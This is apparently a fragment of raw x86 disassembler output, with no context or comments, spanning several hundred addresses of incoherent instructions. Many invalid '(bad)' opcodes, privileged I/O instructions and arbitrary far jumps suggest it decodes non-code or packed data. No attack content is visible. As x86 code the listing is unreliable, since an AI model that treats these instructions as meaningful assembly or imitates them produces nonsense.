  41ac5e:	dec    BYTE PTR [eax]
  41ac60:	pop    es
  41ac61:	aad    0x14
  41ac63:	clc    
  41ac64:	push   ss
  41ac65:	out    0x8b,eax
  41ac67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac68:	hlt    
  41ac69:	adc    bl,ah
  41ac6b:	and    bh,BYTE PTR [eax+0x6f]
  41ac6e:	inc    eax
  41ac6f:	retf   0xceb1
  41ac72:	sub    esp,DWORD PTR [eax]
  41ac74:	dec    ebx
  41ac75:	dec    ebp
  41ac76:	data16 jle 0x41ac26
  41ac79:	in     eax,0x63
  41ac7b:	dec    edi
  41ac7c:	imul   esi,ebx,0x9f3c40c2
  41ac82:	rol    DWORD PTR [esi+ecx*4+0x60],1
  41ac86:	test   DWORD PTR [esi-0x6c],ebx
  41ac89:	jecxz  0x41ac25
  41ac8b:	xchg   ebp,eax
  41ac8c:	mov    BYTE PTR [ecx-0x48e47b0f],ah
  41ac92:	pop    edx
  41ac93:	lock jns 0x41ad05
  41ac96:	jg     0x41ad0c
  41ac98:	xchg   esi,eax
  41ac99:	pusha  
  41ac9a:	sub    dh,cl
  41ac9c:	dec    esp
  41ac9d:	sub    BYTE PTR [edi+eax*2+0x0],0x90
  41aca2:	cmp    dh,BYTE PTR [edi+0x75761895]
  41aca8:	jmp    0x59132482
  41acad:	loopne 0x41ac9f
  41acaf:	push   esp
  41acb0:	outs   dx,DWORD PTR ds:[esi]
  41acb1:	ret    
  41acb2:	cmp    bh,BYTE PTR [ebp-0x5f744b5c]
  41acb8:	sub    al,0x9e
  41acba:	dec    esi
  41acbb:	adc    BYTE PTR [edi+0x60744e1],cl
  41acc1:	pop    ss
  41acc2:	not    DWORD PTR ds:0x7328ca3e
  41acc8:	jne    0x41ad30
  41acca:	pop    es
  41accb:	retf   
  41accc:	sbb    DWORD PTR [eax-0x71],edx
  41accf:	xchg   ebx,eax
  41acd0:	jne    0x41aca5
  41acd2:	in     eax,0x4e
  41acd4:	test   al,0x14
  41acd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acd7:	jecxz  0x41ad04
  41acd9:	stos   BYTE PTR es:[edi],al
  41acda:	(bad)  
  41acdb:	cld    
  41acdc:	xor    eax,DWORD PTR [edx]
  41acde:	sub    dl,bl
  41ace0:	stos   BYTE PTR es:[edi],al
  41ace1:	pop    eax
  41ace2:	loopne 0x41ad60
  41ace4:	cmp    eax,0x40510c25
  41ace9:	dec    esp
  41acea:	retf   
  41aceb:	je     0x41ad09
  41aced:	iret   
  41acee:	adc    al,0x99
  41acf0:	xor    ebx,DWORD PTR [ebx+0x35474303]
  41acf6:	mov    ebx,0x5472fe6a
  41acfb:	leave  
  41acfc:	add    eax,esp
  41acfe:	pushf  
  41acff:	pop    esi
  41ad00:	jbe    0x41ad26
  41ad02:	stos   BYTE PTR es:[edi],al
  41ad03:	dec    ecx
  41ad04:	cwde   
  41ad05:	aaa    
  41ad06:	sbb    DWORD PTR [ebx],ebx
  41ad08:	leave  
  41ad09:	(bad)
  41ad0c:	daa    
  41ad0d:	inc    ecx
  41ad0e:	je     0x41ad2c
  41ad10:	xor    ah,BYTE PTR [esi+0x43]
  41ad13:	lock das 
  41ad15:	retf   0x2a2e
  41ad18:	out    dx,al
  41ad19:	jle    0x41ad86
  41ad1b:	mov    al,0x2e
  41ad1d:	push   esi
  41ad1e:	pop    ebp
  41ad1f:	cmp    eax,DWORD PTR [ecx]
  41ad21:	adc    DWORD PTR [ebp+0x64],ecx
  41ad24:	fld    QWORD PTR [ecx+ecx*2-0x36c73f3]
  41ad2b:	push   ebx
  41ad2c:	mov    edx,0x8b9e5250
  41ad31:	pop    edx
  41ad32:	aas    
  41ad33:	jbe    0x41ad2c
  41ad35:	jnp    0x41acfb
  41ad37:	cmp    DWORD PTR [eax-0x56],0xfffffff4
  41ad3b:	fidivr WORD PTR [esi]
  41ad3d:	dec    esi
  41ad3e:	inc    eax
  41ad3f:	adc    eax,ecx
  41ad41:	stos   BYTE PTR es:[edi],al
  41ad42:	loopne 0x41ad7d
  41ad44:	(bad)  
  41ad45:	out    0x79,eax
  41ad47:	stos   DWORD PTR es:[edi],eax
  41ad48:	test   al,0x75
  41ad4a:	mov    edx,0x91dd631
  41ad4f:	mov    ds:0xbe44cdbc,al
  41ad54:	mov    cl,0xe3
  41ad56:	pop    edx
  41ad57:	jmp    0x41adaf
  41ad59:	fnstcw WORD PTR [ebx+0x5ee15d78]
  41ad5f:	mov    bh,0x83
  41ad61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad62:	pushf  
  41ad63:	xchg   ebx,eax
  41ad64:	dec    edi
  41ad65:	mul    DWORD PTR [eax-0x20]
  41ad68:	retf   0xc3c7
  41ad6b:	xor    ebp,DWORD PTR fs:[esi+ebx*8]
  41ad6f:	or     al,BYTE PTR [ebp-0x64]
  41ad72:	or     ch,BYTE PTR [eax]
  41ad74:	adc    DWORD PTR [edx+edx*4+0x77],esp
  41ad78:	xchg   esp,eax
  41ad79:	stos   DWORD PTR es:[edi],eax
  41ad7a:	add    al,BYTE PTR [ebx]
  41ad7c:	shr    BYTE PTR [esi-0x4d],cl
  41ad7f:	mov    ebx,0x7ab359c5
  41ad84:	nop
  41ad85:	lock push eax
  41ad87:	mov    eax,0xfd472e2d
  41ad8c:	outs   dx,DWORD PTR ds:[esi]
  41ad8d:	loop   0x41ade4
  41ad8f:	fld    TBYTE PTR [ebx+0x29]
  41ad92:	mov    esi,0x62093de0
  41ad97:	fisubr DWORD PTR [esi+0x11]
  41ad9a:	adc    ecx,DWORD PTR [ecx-0x2]
  41ad9d:	push   edx
  41ad9e:	push   ebx
  41ad9f:	and    BYTE PTR [eax+0x1be83871],dl
  41ada5:	fwait
  41ada6:	aad    0x8f
  41ada8:	mov    ah,0xa9
  41adaa:	scas   al,BYTE PTR es:[edi]
  41adab:	push   esp
  41adac:	and    al,0x67
  41adae:	mov    bh,0xbb
  41adb0:	pop    ss
  41adb1:	sbb    BYTE PTR [edx],ah
  41adb3:	lods   al,BYTE PTR ds:[esi]
  41adb4:	lods   al,BYTE PTR es:[esi]
  41adb6:	loopne 0x41adcb
  41adb8:	cwde   
  41adb9:	imul   ebp,DWORD PTR [ebp+0x2d],0xffffffe3
  41adbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adbe:	cwde   
  41adbf:	or     ebx,ebp
  41adc1:	lods   eax,DWORD PTR ds:[esi]
  41adc2:	jmp    0xb1e9ad42
  41adc7:	add    edi,DWORD PTR ds:0x905545c9
  41adcd:	fisubr DWORD PTR [ebx]
  41adcf:	aad    0xbd
  41add1:	dec    bh
  41add3:	jbe    0x41ae23
  41add5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41add6:	fisub  DWORD PTR [eax-0x29]
  41add9:	cmp    eax,0x1a577e62
  41adde:	lods   eax,DWORD PTR ds:[esi]
  41addf:	mov    esi,0x9d834511
  41ade4:	loop   0x41ae42
  41ade6:	pushf  
  41ade7:	test   eax,0x3852b500
  41adec:	les    eax,FWORD PTR [ebx+0x51]
  41adef:	xor    esp,DWORD PTR [ebx-0x4e0315d5]
  41adf5:	push   cs
  41adf6:	test   DWORD PTR [ebp+0x5f],ecx
  41adf9:	pop    ds
  41adfa:	push   0x4c
  41adfc:	xor    ebx,DWORD PTR [edi]
  41adfe:	cwde   
  41adff:	pop    ds
  41ae00:	je     0x41adb3
  41ae02:	xchg   ebp,eax
  41ae03:	inc    esp
  41ae04:	adc    ebx,ebp
  41ae06:	(bad)  
  41ae07:	adc    bl,BYTE PTR [esi-0x17]
  41ae0a:	sub    esi,DWORD PTR [esi+0x58]
  41ae0d:	inc    esp
  41ae0e:	mov    cs,WORD PTR [edx-0x1a]
  41ae11:	dec    DWORD PTR [edx-0x265007fd]
  41ae17:	jecxz  0x41ae42
  41ae19:	lds    edi,FWORD PTR [edi+0x44]
  41ae1c:	jbe    0x41ae02
  41ae1e:	push   edx
  41ae1f:	ds pop es
  41ae21:	xor    eax,0x50860101
  41ae26:	jle    0x41ae00
  41ae28:	pop    edi
  41ae29:	jnp    0x41ae9b
  41ae2b:	inc    edi
  41ae2c:	dec    edi
  41ae2d:	mov    WORD PTR [ecx-0x4d],es
  41ae30:	shl    DWORD PTR [edx+eiz*8],cl
  41ae33:	jnp    0x41ae78
  41ae35:	fsub   DWORD PTR [ebx-0xa]
  41ae38:	cmp    al,0x8c
  41ae3a:	aad    0x75
  41ae3c:	data16 int 0xb1
  41ae3f:	arpl   bx,bx
  41ae41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae42:	mov    esp,DWORD PTR [eax-0x16]
  41ae45:	mov    edi,0x6fbd40e0
  41ae4a:	and    al,0x41
  41ae4c:	mov    al,ds:0x677602e2
  41ae51:	mov    eax,ds:0xa9cfe23b
  41ae56:	out    dx,eax
  41ae57:	inc    esi
  41ae58:	dec    eax
  41ae59:	test   DWORD PTR [esp+ebx*1],0xc21c0e84
  41ae60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae61:	cmp    DWORD PTR [ebx-0x60c7f5c9],edx
  41ae67:	adc    DWORD PTR [edx+0x21],ebx
  41ae6a:	mov    WORD PTR [esi+ecx*2+0x70],es
  41ae6e:	inc    ebx
  41ae6f:	std    
  41ae70:	ins    DWORD PTR es:[edi],dx
  41ae71:	loop   0x41ae7e
  41ae73:	pusha  
  41ae74:	ficomp DWORD PTR [eax+edx*1-0x68118591]
  41ae7b:	xor    DWORD PTR [edi*1-0xd31e149],0x7f6eae36
  41ae86:	xor    al,0xc7
  41ae88:	in     eax,dx
  41ae89:	daa    
  41ae8a:	and    edi,DWORD PTR [edi+edx*2+0x76]
  41ae8e:	rol    BYTE PTR ds:0xd68a0a8f,cl
  41ae94:	dec    ecx
  41ae95:	scas   eax,DWORD PTR es:[edi]
  41ae96:	fld    QWORD PTR [eax+eiz*4]
  41ae99:	jne    0x41ae7e
  41ae9b:	int    0xad
  41ae9d:	pusha  
  41ae9e:	retf   
  41ae9f:	mov    WORD PTR [eax+0x17],fs
  41aea2:	ror    BYTE PTR [ebx+0x96ae665],1
  41aea8:	rcr    DWORD PTR [eax+esi*4-0x23],0xc9
  41aead:	mov    BYTE PTR [esp+ecx*4],bh
  41aeb0:	leave  
  41aeb1:	sub    edi,DWORD PTR [esi-0x76]
  41aeb4:	add    ch,ah
  41aeb6:	xor    ebx,esi
  41aeb8:	rcr    BYTE PTR [esi+0x6a48ed19],1
  41aebe:	scas   eax,DWORD PTR es:[edi]
  41aebf:	sbb    eax,0xdaa9fe91
  41aec4:	and    BYTE PTR [esi+0x17],bl
  41aec7:	sbb    DWORD PTR [ebx+0x30f0fff6],ebx
  41aecd:	push   ebx
  41aece:	pushf  
  41aecf:	je     0x41aed8
  41aed1:	or     al,0xbb
  41aed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed4:	jge    0x41af30
  41aed6:	repz fdiv QWORD PTR [eax-0x3b]
  41aeda:	mov    esi,0xafebef3f
  41aedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee0:	jno    0x41aed9
  41aee2:	jecxz  0x41af56
  41aee4:	xor    eax,0x1b6d4eb4
  41aee9:	adc    al,0x5
  41aeeb:	and    esp,DWORD PTR [ebp+0x6a35074d]
  41aef1:	ret    0x7f87
  41aef4:	add    BYTE PTR [ebx+ecx*4-0x55],0xa6
  41aef9:	fcomp  QWORD PTR [edi]
  41aefb:	aaa    
  41aefc:	in     eax,0x9d
  41aefe:	mov    cl,0x4
  41af00:	sbb    DWORD PTR [ebx],ecx
  41af02:	test   BYTE PTR [esi],0x6
  41af05:	scas   eax,DWORD PTR es:[edi]
  41af06:	pop    ecx
  41af07:	es mov esp,0x8453f9db
  41af0d:	or     BYTE PTR [ebx+0x63a67a67],ch
  41af13:	jbe    0x41af71
  41af15:	or     dl,cl
  41af17:	sub    DWORD PTR ds:0x8438e6e9,0xaea27e3d
  41af21:	add    eax,0x2f6de5b4
  41af26:	(bad)  
  41af27:	fs mov ch,0x59
  41af2a:	fisubr WORD PTR [edx]
  41af2c:	and    bl,ch
  41af2e:	or     DWORD PTR [edi-0x24],0x46962326
  41af35:	not    ebx
  41af37:	push   ss
  41af38:	inc    edx
  41af39:	(bad)  
  41af3a:	mov    dl,0x59
  41af3c:	sub    esp,0xd2e68f00
  41af42:	adc    BYTE PTR [ecx+0x367e50eb],bh
  41af48:	mov    eax,0xa8c301c0
  41af4d:	pusha  
  41af4e:	xchg   esp,eax
  41af4f:	sbb    ecx,esi
  41af51:	ficom  DWORD PTR [ebx+0x35]
  41af54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af55:	push   edx
  41af56:	in     al,0xe8
  41af58:	xlat   BYTE PTR ds:[ebx]
  41af59:	icebp  
  41af5a:	loope  0x41af83
  41af5c:	repz add eax,0x6a41a5b1
  41af62:	push   eax
  41af63:	(bad)  
  41af64:	(bad)  
  41af65:	xchg   esp,eax
  41af66:	repz into 
  41af68:	sbb    bh,bl
  41af6a:	mov    eax,0x6452b136
  41af6f:	mov    bh,0xea
  41af71:	ja     0x41afd1
  41af73:	shr    DWORD PTR [edi-0x23],0xa4
  41af77:	pop    ebx
  41af78:	nop
  41af79:	mov    esi,0xa619cad
  41af7e:	inc    edx
  41af7f:	jb     0x41af4b
  41af81:	(bad)  
  41af82:	repz mov dh,0x53
  41af85:	mov    bh,BYTE PTR [esp+ecx*1+0xd]
  41af89:	lds    ebp,FWORD PTR [eax-0x2441f5af]
  41af8f:	push   es
  41af90:	sub    BYTE PTR [edx-0x1e],al
  41af93:	nop
  41af94:	or     ebp,DWORD PTR [esi+0x24]
  41af97:	stc    
  41af98:	inc    edx
  41af99:	mov    WORD PTR [ebx],cs
  41af9b:	or     esp,DWORD PTR [ebp+0x25]
  41af9e:	or     al,0xe5
  41afa0:	(bad)  
  41afa1:	jno    0x41af49
  41afa3:	jg     0x41afac
  41afa5:	cmp    eax,0x4e0a3717
  41afaa:	cmp    esp,DWORD PTR ss:[ecx+0x18f33d55]
  41afb1:	mov    ds:0x106be1fb,eax
  41afb6:	pusha  
  41afb7:	call   0xfcd49ed3
  41afbc:	outs   dx,DWORD PTR ds:[esi]
  41afbd:	int    0x84
  41afbf:	push   eax
  41afc0:	pop    ebp
  41afc1:	xor    eax,0x3d7d7bd8
  41afc6:	xlat   BYTE PTR ds:[ebx]
  41afc7:	into   
  41afc8:	or     edi,edi
  41afca:	pop    ebx
  41afcb:	cmp    esp,DWORD PTR [esi+0x75400486]
  41afd1:	jle    0x41b027
  41afd3:	dec    ebp
  41afd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afd5:	daa    
  41afd6:	lods   al,BYTE PTR ds:[esi]
  41afd7:	dec    ecx
  41afd8:	sub    ah,bl
  41afda:	jle    0x41b002
  41afdc:	loope  0x41b011
  41afde:	jle    0x41b003
  41afe0:	fldcw  WORD PTR [eax+0x66]
  41afe3:	dec    ecx
  41afe4:	(bad)  
  41afe5:	jns    0x41afee
  41afe7:	mov    ecx,0xa5789f2e
  41afec:	jmp    0x2f33:0xe1a0445c
  41aff3:	xchg   ebp,eax
  41aff4:	jp     0x41b064
  41aff6:	xor    BYTE PTR [esi+ebx*2+0x7c],dh
  41affa:	adc    bl,BYTE PTR [ebx]
  41affc:	mov    ecx,0xf03dc415
  41b001:	lds    ebp,FWORD PTR [edx]
  41b003:	and    ecx,DWORD PTR [ecx]
  41b005:	sbb    DWORD PTR [ebp+0x69],0x2ee83ff1
  41b00c:	(bad)  
  41b00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b00e:	ss fsubrp st(1),st
  41b011:	mov    ch,0xe2
  41b013:	cmc    
  41b014:	add    BYTE PTR [esp+ebx*2],0x9e
  41b018:	jbe    0x41b04a
  41b01a:	rol    edx,0xcf
  41b01d:	lods   eax,DWORD PTR ds:[esi]
  41b01e:	test   BYTE PTR [edi-0x25],bh
  41b021:	push   edi
  41b022:	fwait
  41b023:	popf   
  41b024:	fs retf 
  41b026:	xor    al,0xb0
  41b028:	inc    esp
  41b029:	ins    BYTE PTR es:[edi],dx
  41b02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b02b:	sahf   
  41b02c:	rcl    DWORD PTR [edx-0x1c7f550a],1
  41b032:	push   ss
  41b033:	xchg   ebp,eax
  41b034:	mov    ds:0xf9d72473,al
  41b039:	sub    eax,0xb3988cab
  41b03e:	mov    ebp,0x796a92b1
  41b043:	mov    bh,0xc6
  41b045:	fidiv  WORD PTR [edi]
  41b047:	mov    ebx,0xce46e71d
  41b04c:	and    eax,0xf63890bc
  41b051:	jb     0x41b0ce
  41b053:	dec    edx
  41b054:	repz call 0xf9:0x3740f6a4
  41b05c:	jo     0x41b0d5
  41b05e:	arpl   WORD PTR [ecx+edi*4],si
  41b061:	imul   ebx,DWORD PTR [ecx-0x4b],0x5d40da60
  41b068:	jge    0x41b043
  41b06a:	bound  ecx,QWORD PTR [eax]
  41b06c:	stc    
  41b06d:	out    dx,eax
  41b06e:	pusha  
  41b06f:	cs in  al,0x57
  41b072:	dec    edi
  41b073:	mov    bl,0x63
  41b075:	ss in  al,0x50
  41b078:	push   0x2e319004
  41b07d:	rcr    DWORD PTR [ecx+eiz*8],1
  41b080:	and    DWORD PTR [edx-0x7],ecx
  41b083:	lea    eax,[edx]
  41b085:	popf   
  41b086:	mov    edi,0x4d2de4fa
  41b08b:	xchg   ebp,eax
  41b08c:	jg     0x41b032
  41b08e:	ja     0x41b087
  41b090:	pop    esi
  41b091:	xor    al,0x44
  41b093:	jp     0x41b01e
  41b095:	lea    esp,[esi-0x27bc257d]
  41b09b:	add    ecx,0x2d
  41b09e:	mov    ah,0xc7
  41b0a0:	xchg   dl,al
  41b0a2:	dec    edi
  41b0a3:	mov    WORD PTR [esi+0x540a8c5b],?
  41b0a9:	sub    edi,esp
  41b0ab:	pop    edx
  41b0ac:	outs   dx,DWORD PTR ds:[esi]
  41b0ad:	leave  
  41b0ae:	mov    ah,0xc2
  41b0b0:	cmp    ah,cl
  41b0b2:	imul   DWORD PTR [ebx-0x4e]
  41b0b5:	or     al,0xce
  41b0b7:	or     BYTE PTR ds:0x898d5609,dh
  41b0bd:	fwait
  41b0be:	xchg   ecx,eax
  41b0bf:	or     edi,DWORD PTR [ecx]
  41b0c1:	stos   DWORD PTR es:[edi],eax
  41b0c2:	inc    esi
  41b0c3:	add    eax,0xe82e9266
  41b0c8:	cli    
  41b0c9:	mov    cl,0x59
  41b0cb:	add    BYTE PTR [eax+0x2f87cd53],ah
  41b0d1:	dec    edx
  41b0d2:	xlat   BYTE PTR ds:[ebx]
  41b0d3:	mov    ds:0x57fc91ec,eax
  41b0d8:	sub    eax,0x36eb7336
  41b0dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0de:	scas   eax,DWORD PTR es:[edi]
  41b0df:	push   edx
  41b0e0:	xor    DWORD PTR [edi-0x7e5741f9],ebp
  41b0e6:	addr16 dec esp
  41b0e8:	fistp  QWORD PTR [esi+0x35]
  41b0eb:	xor    dl,BYTE PTR [esi-0x56]
  41b0ee:	jg     0x41b095
  41b0f0:	enter  0x544a,0xd4
  41b0f4:	ins    DWORD PTR es:[di],dx
  41b0f6:	nop
  41b0f7:	adc    eax,0x5d57b8dc
  41b0fc:	iret   
  41b0fd:	fsub   QWORD PTR [eax+0x3e]
  41b100:	xor    DWORD PTR [ecx+0x7d],edx
  41b103:	adc    DWORD PTR [ebx+0x39],0xffffffa7
  41b107:	retf   
  41b108:	das    
  41b109:	ret    0xda38
  41b10c:	into   
  41b10d:	addr16 jns 0x41b0fa
  41b110:	or     bh,cl
  41b112:	mov    ds:0x181126ba,eax
  41b117:	imul   edi,DWORD PTR [edx+0x714b17dd],0x5a1b43ae
  41b121:	cmp    eax,0x4c3ab695
  41b126:	arpl   WORD PTR [ecx+0x3ce150f5],cx
  41b12c:	ins    BYTE PTR es:[edi],dx
  41b12d:	cmp    edx,DWORD PTR [esi+0x13b4f6d7]
  41b133:	and    edx,0x24
  41b136:	xchg   DWORD PTR [ecx],esp
  41b138:	mov    eax,0x8cdd9760
  41b13d:	sub    dh,cl
  41b13f:	dec    ebx
  41b140:	iret   
  41b141:	loop   0x41b1b7
  41b143:	jecxz  0x41b132
  41b145:	dec    ebp
  41b146:	jmp    0xe0b3eea
  41b14b:	pop    ss
  41b14c:	add    edi,DWORD PTR [edi-0x1368e87d]
  41b152:	lea    eax,[ecx-0x3a]
  41b155:	sbb    BYTE PTR [edx+0x78],ah
  41b158:	cmc    
  41b159:	mov    bh,0xf8
  41b15b:	jnp    0x41b1bf
  41b15d:	cmc    
  41b15e:	push   ecx
  41b15f:	cmp    eax,0x44ae4cbf
  41b164:	test   eax,0x129a273d
  41b169:	ficomp WORD PTR [ecx+edx*4+0x4bfbc7d9]
  41b170:	aas    
  41b171:	ss icebp 
  41b173:	adc    bh,BYTE PTR [ebp-0x2a810cde]
  41b179:	in     al,dx
  41b17a:	mov    esp,0x64719ff2
  41b17f:	call   0x43fced35
  41b184:	(bad)  
  41b185:	jg     0x41b144
  41b187:	mov    edi,0x3468e0cc
  41b18c:	inc    ecx
  41b18d:	pmulhuw mm5,QWORD PTR [edi-0x53982ce1]
  41b194:	jne    0x41b1a2
  41b196:	clc    
  41b197:	cwde   
  41b198:	mov    cl,0x90
  41b19a:	call   0xea03:0x82ec0de5
  41b1a1:	xchg   DWORD PTR [eax-0x307b1f67],ecx
  41b1a7:	sub    eax,DWORD PTR [eax+esi*8-0x8]
  41b1ab:	sub    edi,edi
  41b1ad:	xchg   edi,eax
  41b1ae:	and    DWORD PTR [ecx+0x7a5152f2],eax
  41b1b4:	mov    ch,0x72
  41b1b6:	pop    ebx
  41b1b7:	scas   al,BYTE PTR es:[edi]
  41b1b8:	sbb    al,0xeb
  41b1ba:	add    eax,0x943ee306
  41b1bf:	ror    DWORD PTR [edx],1
  41b1c1:	jmp    0xb3af0149
  41b1c6:	ret    
  41b1c7:	xor    dh,ah
  41b1c9:	or     cl,cl
  41b1cb:	mov    ds,WORD PTR [ebp+0x46]
  41b1ce:	inc    eax
  41b1cf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41b1d1:	pop    ecx
  41b1d2:	int    0xa
  41b1d4:	repz mov ebx,DWORD PTR [edx-0x64]
  41b1d8:	mov    bh,0xfa
  41b1da:	sti    
  41b1db:	jg     0x41b1f1
  41b1dd:	pop    ebp
  41b1de:	jmp    0x91aa:0x3044f486
  41b1e5:	xchg   edx,edx
  41b1e7:	pop    ds
  41b1e8:	add    dh,BYTE PTR [ebx-0x2b]
  41b1eb:	mov    ebx,0x494cfb4e
  41b1f0:	dec    ecx
  41b1f1:	(bad)  
  41b1f2:	bound  ebp,QWORD PTR [eax+eax*8-0x2d773d1b]
  41b1f9:	cmp    al,BYTE PTR [ecx-0xb4aaacc]
  41b1ff:	repz int 0x16
  41b202:	repnz dec ebx
  41b204:	mov    eax,0xa7e36162
  41b209:	mov    ch,0x59
  41b20b:	jbe    0x41b1c2
  41b20d:	lods   al,BYTE PTR ds:[esi]
  41b20e:	shl    BYTE PTR ds:0x73f487df,1
  41b214:	add    al,0xcc
  41b216:	xchg   ebx,eax
  41b217:	(bad)  
  41b218:	out    0x3a,al
  41b21a:	push   0x94888063
  41b21f:	popa   
  41b220:	mov    cl,0xa5
  41b222:	fucom  st(6)
  41b224:	inc    esp
  41b225:	into   
  41b226:	scas   al,BYTE PTR es:[edi]
  41b227:	addr16 aam 0x26
  41b22a:	fdiv   DWORD PTR [eax]
  41b22c:	aas    
  41b22d:	adc    eax,edi
  41b22f:	xchg   esi,eax
  41b230:	jle    0x41b1f8
  41b232:	mov    ebp,0x6e9dbe56
  41b237:	pop    edx
  41b238:	xor    eax,DWORD PTR [edi]
  41b23a:	clc    
  41b23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b23c:	mov    ecx,0xad3c1b09
  41b241:	test   bh,0x5e
  41b244:	es jae 0x41b222
  41b247:	dec    ebp
  41b248:	out    dx,eax
  41b249:	pop    esi
  41b24a:	push   edi
  41b24b:	fist   DWORD PTR [esi-0x4e7404c5]
  41b251:	scas   al,BYTE PTR es:[edi]
  41b252:	leave  
  41b253:	cmp    eax,0x8c1c2b5f
  41b258:	or     DWORD PTR [ebx+eiz*4],ebx
  41b25b:	pop    eax
  41b25c:	dec    eax
  41b25d:	mov    ebx,0x6cddc2c8
  41b262:	push   edx
  41b263:	mov    eax,cs:0x11586b69
  41b269:	mov    bl,0x0
  41b26b:	sbb    al,0xce
  41b26d:	fdivr  DWORD PTR [ebp+0xd47ab69]
  41b273:	dec    esp
  41b274:	mov    ss,edx
  41b276:	cmovae esp,esp
  41b279:	mov    dl,0x87
  41b27b:	xor    BYTE PTR [ebp+0x57],bh
  41b27e:	clc    
  41b27f:	dec    ecx
  41b280:	and    esp,ecx
  41b282:	(bad)  
  41b283:	clc    
  41b284:	sbb    al,0xa3
  41b286:	xchg   edi,eax
  41b287:	shr    DWORD PTR [ebp-0x40971f54],1
  41b28d:	fbstp  TBYTE PTR [ecx+0x37a99e1c]
  41b293:	(bad)  
  41b294:	les    edi,FWORD PTR [edx+0x789344f1]
  41b29a:	xor    al,0x16
  41b29c:	out    dx,al
  41b29d:	ds jae 0x41b247
  41b2a0:	es mov ebp,esi
  41b2a3:	push   ebp
  41b2a4:	xchg   esi,eax
  41b2a5:	pop    ds
  41b2a6:	(bad)  
  41b2a7:	sbb    esp,DWORD PTR [eax]
  41b2a9:	aaa    
  41b2aa:	xchg   ebx,eax
  41b2ab:	xchg   esi,eax
  41b2ac:	popa   
  41b2ad:	xchg   ebx,eax
  41b2ae:	sub    eax,0xdba85a99
  41b2b3:	push   ss
  41b2b4:	inc    edi
  41b2b5:	sub    ah,al
  41b2b7:	out    dx,al
  41b2b8:	pop    edx
  41b2b9:	jecxz  0x41b32b
  41b2bb:	pop    ss
  41b2bc:	loop   0x41b244
  41b2be:	movd   esi,mm3
  41b2c1:	(bad)  
  41b2c2:	add    BYTE PTR [edx-0x53],ah
  41b2c5:	xchg   BYTE PTR [ecx+0x0],bh
  41b2c8:	push   edi
  41b2c9:	add    bl,dh
  41b2cb:	and    eax,edi
  41b2cd:	cmp    BYTE PTR [eax+0x0],cl
  41b2d0:	mov    dh,dl
  41b2d2:	pop    edi
  41b2d3:	sbb    esi,DWORD PTR [edi+0xb27ea2f]
  41b2d9:	in     al,0x58
  41b2db:	xchg   ebx,eax
  41b2dc:	xchg   esp,eax
  41b2dd:	pop    eax
  41b2de:	add    esi,DWORD PTR [esi]
  41b2e0:	jne    0x41b34a
  41b2e2:	repnz dec esi
  41b2e4:	gs call 0xf7e4:0xd57184e6
  41b2ec:	fxch   st(3)
  41b2ee:	das    
  41b2ef:	jg     0x41b273
  41b2f1:	fwait
  41b2f2:	mov    ds:0x917c5208,al
  41b2f7:	xchg   DWORD PTR [ebp+0x37],esp
  41b2fa:	sub    DWORD PTR [ecx],ecx
  41b2fc:	xchg   edi,eax
  41b2fd:	fucom  st(4)
  41b2ff:	mov    WORD PTR [ebp+0xe349e44],?
  41b305:	fcomip st,st(5)
  41b307:	mov    eax,0xce19cea8
  41b30c:	mov    ch,0x54
  41b30e:	jecxz  0x41b2bf
  41b310:	mov    edi,0x91e2b9ab
  41b315:	and    ah,BYTE PTR [eax-0x2a3177b7]
  41b31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b31c:	or     BYTE PTR [edx+0x75],dl
  41b31f:	cld    
  41b320:	fcomp  QWORD PTR [eax+0x9260f5d]
  41b326:	fistp  DWORD PTR [edx+0x33]
  41b329:	fidiv  DWORD PTR [esi+0x1a]
  41b32c:	cwde   
  41b32d:	test   al,0xac
  41b32f:	adc    BYTE PTR [edx+0x8],bl
  41b332:	xor    al,0x1f
  41b334:	imul   edx,DWORD PTR [ebx+0x77],0xffffff85
  41b338:	mov    dh,0x6a
  41b33a:	sar    ah,1
  41b33c:	jle    0x41b319
  41b33e:	mov    ch,0xc7
  41b340:	rcr    BYTE PTR cs:[ebp-0x5e],cl
  41b344:	xor    al,0xce
  41b346:	inc    edx
  41b347:	repnz stos BYTE PTR es:[edi],al
  41b349:	pop    esi
  41b34a:	sbb    al,0x64
  41b34c:	in     eax,dx
  41b34d:	hlt    
  41b34e:	push   0x74
  41b350:	ds push ds
  41b352:	shl    DWORD PTR [ebx+eax*1+0x5da71844],1
  41b359:	jo     0x41b361
  41b35b:	add    al,0x83
  41b35d:	mov    dl,0xd2
  41b35f:	(bad)  
  41b360:	iret   
  41b361:	adc    esp,DWORD PTR [edx+0x7d]
  41b364:	ja     0x41b2ec
  41b366:	sbb    edi,ebx
  41b368:	push   cs
  41b369:	mov    eax,0xace6267f
  41b36e:	clc    
  41b36f:	call   0x968d:0xf7221d9a
  41b376:	arpl   WORD PTR [ecx-0x39],si
  41b379:	stc    
  41b37a:	aaa    
  41b37b:	add    DWORD PTR [esi-0x63],eax
  41b37e:	inc    bh
  41b380:	mov    ah,0x7d
  41b382:	xor    dl,BYTE PTR [eax+esi*1-0x7bcc96a1]
  41b389:	pop    esp
  41b38a:	arpl   WORD PTR [edi],bp
  41b38c:	repnz mov esp,0x604b43f7
  41b392:	add    BYTE PTR [edx-0x55a6ed65],ah
  41b398:	in     eax,dx
  41b399:	mov    BYTE PTR [eax-0x1ee0cd22],cl
  41b39f:	push   esp
  41b3a0:	aas    
  41b3a1:	fmul   QWORD PTR [edx]
  41b3a3:	(bad)  
  41b3a4:	fsubp  st(3),st
  41b3a6:	(bad)  
